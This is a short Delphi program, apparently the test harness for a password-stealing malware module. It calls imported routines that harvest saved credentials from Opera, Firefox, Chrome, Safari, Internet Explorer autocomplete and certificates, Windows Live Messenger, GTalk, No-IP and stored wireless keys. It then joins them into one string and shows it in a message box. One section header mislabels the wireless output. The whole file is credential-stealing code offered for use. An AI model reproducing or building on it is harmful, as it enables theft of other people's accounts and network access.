program teste;

uses
  windows,
  UnitFireFox3_5,
  UnitChrome,
  UnitPasswords,
  UnitWep,
  PasswordRecovery,
  SafariPasswordRecovery,
  Miranda,
  OperaPasswords;

var
  TempStr: string;
begin
  TempStr := TempStr + 'Opera Passwords:' + #13#10 + GetOperaPasswords('wand.dat', '***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'Firefox 3.5 ou superior:' + #13#10 + Mozilla3_5Password('***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'Chrome Passwords:' + #13#10 + GetChromePass('sqlite3.dll', '***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'Windows Live Messenger:' + #13#10 + GetWindowsLiveMessengerPasswords('***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'Firefox 3.4 ou anterior:' + #13#10 + GetFirefoxPasswords('***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'GetIELoginPass (RAS Password):' + #13#10 + GetIELoginPass('***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'GrabAllIEpasswords:' + #13#10 + GrabAllIEpasswords('***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'ShowAllIeAutocompletePWs:' + #13#10 + ShowAllIeAutocompletePWs('***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'ShowAllIEWebCert:' + #13#10 + ShowAllIEWebCert('***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'No-IP Password:' + #13#10 + noip_DUCpasswords('***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'ShowIEAutoCompletePlain:' + #13#10 + xShowIEAutoCompletePlain('***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'GTalk:' + #13#10 + GetGTalkPW('***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'Safari:' + #13#10 + GetSafariPasswords('***') + '------------------------------------------------' + #13#10;
  TempStr := TempStr + 'ShowIEAutoCompletePlain:' + #13#10 + ObtainWirelessPasswords('***');
  messagebox(0, pchar(TempStr), '', 0);
end.


